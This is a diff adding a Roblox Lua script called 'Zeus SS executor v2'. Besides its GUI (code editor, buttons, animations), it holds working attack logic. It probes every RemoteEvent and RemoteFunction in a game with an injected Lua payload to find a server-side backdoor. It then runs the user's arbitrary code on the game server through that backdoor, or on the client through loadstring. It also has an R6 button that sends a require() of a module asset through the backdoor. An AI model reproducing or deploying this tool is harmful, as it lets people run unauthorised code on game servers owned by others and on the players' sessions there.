+LMG2L["Panel_11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["Panel_11"]["MultiLine"] = true;
+LMG2L["Panel_11"]["ClearTextOnFocus"] = false;
+LMG2L["Panel_11"]["ClipsDescendants"] = true;
+LMG2L["Panel_11"]["PlaceholderText"] = [[-- Welcome to Zeus SS! ]];
+LMG2L["Panel_11"]["Size"] = UDim2.new(0, 480, 0, 286);
+LMG2L["Panel_11"]["Position"] = UDim2.new(0, 176, 0, 44);
+LMG2L["Panel_11"]["Text"] = [[]];
+LMG2L["Panel_11"]["BackgroundTransparency"] = 1;
+
+
+LMG2L["UIPadding_12"] = Instance.new("UIPadding", LMG2L["Panel_11"]);
+LMG2L["UIPadding_12"]["PaddingTop"] = UDim.new(0, 10);
+LMG2L["UIPadding_12"]["PaddingLeft"] = UDim.new(0, 10);
+
+
+LMG2L["Close_13"] = Instance.new("TextButton", LMG2L["Main_2"]);
+LMG2L["Close_13"]["BorderSizePixel"] = 0;
+LMG2L["Close_13"]["TextSize"] = 23;
+LMG2L["Close_13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Close_13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Close_13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["Close_13"]["BackgroundTransparency"] = 1;
+LMG2L["Close_13"]["Size"] = UDim2.new(0, 52, 0, 42);
+LMG2L["Close_13"]["Text"] = [[X]];
+LMG2L["Close_13"]["Name"] = [[Close]];
+LMG2L["Close_13"]["Position"] = UDim2.new(0, 612, 0, 0);
+
+
+LMG2L["OpenGui_14"] = Instance.new("ImageButton", LMG2L["ZeusGui_1"]);
+LMG2L["OpenGui_14"]["BorderSizePixel"] = 0;
+LMG2L["OpenGui_14"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["OpenGui_14"]["Image"] = [[rbxassetid://127844177930647]];
+LMG2L["OpenGui_14"]["Size"] = UDim2.new(0, 50, 0, 50);
+LMG2L["OpenGui_14"]["Name"] = [[OpenGui]];
+LMG2L["OpenGui_14"]["Position"] = UDim2.new(0, 52, 0, 62);
+
+
+LMG2L["UICorner_15"] = Instance.new("UICorner", LMG2L["OpenGui_14"]);
+LMG2L["UICorner_15"]["CornerRadius"] = UDim.new(1, 0);
+
+LMG2L["R6_12"] = Instance.new("TextButton", LMG2L["Main_2"]);
+LMG2L["R6_12"]["TextWrapped"] = true;
+LMG2L["R6_12"]["BorderSizePixel"] = 0;
+LMG2L["R6_12"]["TextXAlignment"] = Enum.TextXAlignment.Right;
+LMG2L["R6_12"]["TextSize"] = 24;
+LMG2L["R6_12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["R6_12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["R6_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["R6_12"]["BackgroundTransparency"] = 1;
+LMG2L["R6_12"]["Size"] = UDim2.new(0, 118, 0, 40);
+LMG2L["R6_12"]["Text"] = [[R6]];
+LMG2L["R6_12"]["Name"] = [[R6]];
+LMG2L["R6_12"]["Position"] = UDim2.new(0, 26, 0, 188);
+
+
+LMG2L["ImageLabel_13"] = Instance.new("ImageLabel", LMG2L["R6_12"]);
+LMG2L["ImageLabel_13"]["BorderSizePixel"] = 0;
+LMG2L["ImageLabel_13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+-- LMG2L["ImageLabel_13"]["ImageContent"] = ;
+LMG2L["ImageLabel_13"]["Image"] = [[rbxassetid://126709396385774]];
+LMG2L["ImageLabel_13"]["Size"] = UDim2.new(0, 40, 0, 40);
+LMG2L["ImageLabel_13"]["BackgroundTransparency"] = 1;
+
+
+LMG2L["Re_14"] = Instance.new("TextButton", LMG2L["Main_2"]);
+LMG2L["Re_14"]["TextWrapped"] = true;
+LMG2L["Re_14"]["BorderSizePixel"] = 0;
+LMG2L["Re_14"]["TextXAlignment"] = Enum.TextXAlignment.Right;
+LMG2L["Re_14"]["TextSize"] = 24;
+LMG2L["Re_14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Re_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Re_14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["Re_14"]["BackgroundTransparency"] = 1;
+LMG2L["Re_14"]["Size"] = UDim2.new(0, 118, 0, 40);
+LMG2L["Re_14"]["Text"] = [[RE]];
+LMG2L["Re_14"]["Name"] = [[Re]];
+LMG2L["Re_14"]["Position"] = UDim2.new(0, 26, 0, 234);
+
+
+LMG2L["ImageLabel_15"] = Instance.new("ImageLabel", LMG2L["Re_14"]);
+LMG2L["ImageLabel_15"]["BorderSizePixel"] = 0;
+LMG2L["ImageLabel_15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+-- LMG2L["ImageLabel_15"]["ImageContent"] = ;
+LMG2L["ImageLabel_15"]["Image"] = [[rbxassetid://89882605403864]];
+LMG2L["ImageLabel_15"]["Size"] = UDim2.new(0, 40, 0, 40);
+LMG2L["ImageLabel_15"]["BackgroundTransparency"] = 1;
+
+
+-- ===== SERVICES =====
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local Main = LMG2L["Main_2"]
+local Panel = LMG2L["Panel_11"]
+local OpenGui = LMG2L["OpenGui_14"]
+local StatusLabel = LMG2L["StatusLabel_10"]
+
+-- ===== TYPEWRITER TITLE =====
+local Title = LMG2L["Title_5"]
+
+local texts = {
+    "Zeus executor SS v2",
+    "Script by goodHAXXOR and KrystalArial",
+    "The best SS executor!"
+}
+
+local typingSpeed = 0.03
+local deletingSpeed = 0.02
+local delayBetween = 1
+
+local function typeText(text)
+    Title.Text = ""
+    for i = 1, #text do
+        Title.Text = string.sub(text, 1, i)
+        task.wait(typingSpeed)
+    end
+end
+
+local function deleteText()
+    local current = Title.Text
+    for i = #current, 0, -1 do
+        Title.Text = string.sub(current, 1, i)
+        task.wait(deletingSpeed)
+    end
+end
+
+task.spawn(function()
+    while true do
+        for _, text in ipairs(texts) do
+            typeText(text)
+            task.wait(delayBetween)
+            deleteText()
+        end
+    end
+end)
+
+
+
+-- ===== ПЕРЕМЕННЫЕ СТАТУСА =====
+local isInjected = false
+local BackdoorRemote = nil
+
+-- ===== ФУНКЦИЯ СКАНА БЭКДОРА (как в LALOL Hub) =====
+local function scanForBackdoor()
+    local remotes = {}
+    
+    -- Генератор случайного имени
+    local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+    local function generateName(length)
+        local text = ''
+        for i = 1, length do
+            text = text .. alphabet[math.random(1, #alphabet)]
+        end
+        return text
+    end
+    
+    -- Отправка через Remote
+    local function runRemote(remote, data)
+        if remote:IsA('RemoteEvent') then
+            remote:FireServer(data)
+        elseif remote:IsA('RemoteFunction') then
+            spawn(function() 
+                pcall(function()
+                    remote:InvokeServer(data)
+                end)
+            end)
+        end
+    end
+    
+    -- Проверка защищённого бэкдора
+    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
+    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+        local code
+        while true do
+            code = generateName(math.random(12, 30))
+            if not remotes[code] then break end
+        end
+        spawn(function() 
+            pcall(function()
+                protected_backdoor:InvokeServer('lalol hub join today!!', "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+            end)
+        end)
+        remotes[code] = protected_backdoor
+    end
+    
+    -- Сканируем все RemoteEvent и RemoteFunction
+    for _, remote in game:GetDescendants() do
+        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then
+            continue
+        end
+        
+        -- Пропускаем системные
+        local fullName = remote:GetFullName()
+        if string.split(fullName, '.')[1] == 'RobloxReplicatedStorage' then
+            continue
+        end
+        
+        if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
+            continue
+        end
+        
+        if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' then
+            continue
+        end
+        
+        if remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
+            continue
+        end
+        
+        -- Отправляем тест
+        local code
+        while true do
+            code = generateName(math.random(12, 30))
+            if not remotes[code] then break end
+        end
+        
+        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+        remotes[code] = remote
+    end
+    
+    -- Ждём и проверяем результат
+    for i = 1, 50 do
+        for code, remote in pairs(remotes) do
+            local obj = workspace:FindFirstChild(code)
+            if obj then
+                -- Нашли бэкдор!
+                pcall(function() obj:Destroy() end)
+                return remote
+            end
+        end
+        task.wait(0.05)
+    end
+    
+    return nil
+end
+
+-- ===== ОБРАБОТЧИК INJECT =====
+LMG2L["Inject_e"].MouseButton1Click:Connect(function()
+    StatusLabel.Text = "Status: Injecting"
+    
+    -- Запускаем сканирование
+    local backdoor = scanForBackdoor()
+    
+    if backdoor then
+        BackdoorRemote = backdoor
+        isInjected = true
+        StatusLabel.Text = "Status: Injected!"
+        wait(2)
+        StatusLabel.Text = "Status: Server side"
+        print("[Zeus] Бэкдор найден:", backdoor:GetFullName())
+    else
+        isInjected = false
+        BackdoorRemote = nil
+        StatusLabel.Text = "Status: Not injected :("
+        wait(2)
+        StatusLabel.Text = "Status: Client side"
+        print("[Zeus] Бэкдор не найден")
+    end
+end)
+
+-- ===== ВЫПОЛНЕНИЕ КОДА =====
+LMG2L["Exe_8"].MouseButton1Click:Connect(function()
+    local code = Panel.Text
+    if not code or code == "" then
+        return
+    end
+    
+    if isInjected and BackdoorRemote then
+        -- Выполнение на сервере через найденный Remote
+        print("[Zeus] Выполнение на сервере через:", BackdoorRemote:GetFullName())
+        
+        if BackdoorRemote:IsA('RemoteEvent') then
+            BackdoorRemote:FireServer(code)
+        elseif BackdoorRemote:IsA('RemoteFunction') then
+            spawn(function()
+                local success, result = pcall(function()
+                    return BackdoorRemote:InvokeServer(code)
+                end)
+                if success and result then
+                    print("[Zeus] Результат:", result)
+                end
+            end)
+        end
+    else
+        -- Выполнение на клиенте
+        print("[Zeus] Выполнение на клиенте")
+        pcall(function()
+            loadstring(code)()
+        end)
+    end
+end)
+
+-- ===== SCROLL =====
+local Scroll = Instance.new("ScrollingFrame", Main)
+Scroll.BackgroundTransparency = 1
+Scroll.Size = Panel.Size
+Scroll.Position = Panel.Position
+Scroll.CanvasSize = UDim2.new(0,0,0,0)
+Scroll.ScrollBarThickness = 6
+Scroll.BorderSizePixel = 0
+
+Panel.Parent = Scroll
+Panel.Size = UDim2.new(1, -10, 0, 276)
+Panel.Position = UDim2.new(0, 45, 0, 0)
+
+-- ===== LINE NUMBERS =====
+local LineNumbers = Instance.new("TextLabel", Scroll)
+LineNumbers.BackgroundTransparency = 1
+LineNumbers.Position = UDim2.new(0, 5, 0, 10)
+LineNumbers.Size = UDim2.new(0, 35, 0, 276)
+LineNumbers.FontFace = Panel.FontFace
+LineNumbers.TextSize = Panel.TextSize
+LineNumbers.TextColor3 = Color3.fromRGB(140,140,140)
+LineNumbers.TextXAlignment = Enum.TextXAlignment.Right
+LineNumbers.TextYAlignment = Enum.TextYAlignment.Top
+LineNumbers.Text = "1"
+
+-- ===== REFRESH =====
+local function refresh()
+    local text = Panel.Text or ""
+
+    local count = 1
+    for _ in text:gmatch("\n") do
+        count += 1
+    end
+
+    local lines = {}
+    for i = 1, count do
+        lines[i] = i
+    end
+
+    LineNumbers.Text = table.concat(lines, "\n")
+
+    local h = math.max(276, count * 18 + 20)
+
+    Panel.Size = UDim2.new(1, -50, 0, h)
+    LineNumbers.Size = UDim2.new(0, 35, 0, h)
+    Scroll.CanvasSize = UDim2.new(0, 0, 0, h + 20)
+end
+
+Panel:GetPropertyChangedSignal("Text"):Connect(function()
+    task.defer(refresh)
+end)
+
+refresh()
+
+-- ===== CLEAR =====
+LMG2L["Clear_a"].MouseButton1Click:Connect(function()
+    Panel.Text = ""
+end)
+
+-- ===== ANIMATION =====
+local MainPos = Main.Position
+local OpenPos = OpenGui.Position
+
+local function tween(gui, size, time, pos)
+    local oldAnchor = gui.AnchorPoint
+
+    gui.AnchorPoint = Vector2.new(0.5, 0.5)
+    gui.Position = UDim2.new(
+        pos.X.Scale,
+        pos.X.Offset + gui.Size.X.Offset/2,
+        pos.Y.Scale,
+        pos.Y.Offset + gui.Size.Y.Offset/2
+    )
+
+    local t = TweenService:Create(gui, TweenInfo.new(time, Enum.EasingStyle.Quad), {
+        Size = size
+    })
+
+    t:Play()
+    t.Completed:Wait()
+
+    gui.AnchorPoint = oldAnchor
+    gui.Position = pos
+end
+
+-- CLOSE
+LMG2L["Close_13"].MouseButton1Click:Connect(function()
+    tween(Main, UDim2.new(0,0,0,0), 0.2, MainPos)
+    Main.Visible = false
+
+    OpenGui.Size = UDim2.new(0,0,0,0)
+    OpenGui.Visible = true
+
+    tween(OpenGui, UDim2.new(0,50,0,50), 0.2, OpenPos)
+end)
+
+-- OPEN
+OpenGui.MouseButton1Click:Connect(function()
+    tween(OpenGui, UDim2.new(0,0,0,0), 0.2, OpenPos)
+    OpenGui.Visible = false
+
+    Main.Size = UDim2.new(0,0,0,0)
+    Main.Visible = true
+
+    tween(Main, UDim2.new(0, 658, 0, 326), 0.2, MainPos)
+end)
+
+-- ===== DRAG =====
+local function drag(gui)
+    local dragging = false
+    local dragInput
+    local dragStart
+    local startPos
+
+    gui.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 
+        or input.UserInputType == Enum.UserInputType.Touch then
+
+            dragging = true
+            dragStart = input.Position
+            startPos = gui.Position
+            dragInput = input
+        end
+    end)
+
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement 
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UIS.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+
+            gui.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+
+    gui.InputEnded:Connect(function(input)
+        if input == dragInput then
+            dragging = false
+        end
+    end)
+end
+
+
+drag(Main)
+drag(OpenGui)
+
+-- ===== ОБРАБОТЧИК Re (РЕСПАВН ПЕРСОНАЖА) =====
+LMG2L["Re_14"].MouseButton1Click:Connect(function()
+    local character = Players.LocalPlayer.Character
+    if character and character:FindFirstChild("Humanoid") then
+        character.Humanoid.Health = 0
+    end
+end)
+
+-- ===== ОБРАБОТЧИК R6 =====
+LMG2L["R6_12"].MouseButton1Click:Connect(function()
+    if not isInjected or not BackdoorRemote then return end
+    
+    local code = [[require(0x71E8BD0C7A44):R6("]] .. Players.LocalPlayer.Name .. [[")]]
+    
+    if BackdoorRemote:IsA('RemoteEvent') then
+        BackdoorRemote:FireServer(code)
+    elseif BackdoorRemote:IsA('RemoteFunction') then
+        spawn(function()
+            pcall(function()
+                BackdoorRemote:InvokeServer(code)
+            end)
+        end)
+    end
+end)
+
+
+return LMG2L["ZeusGui_1"], require;
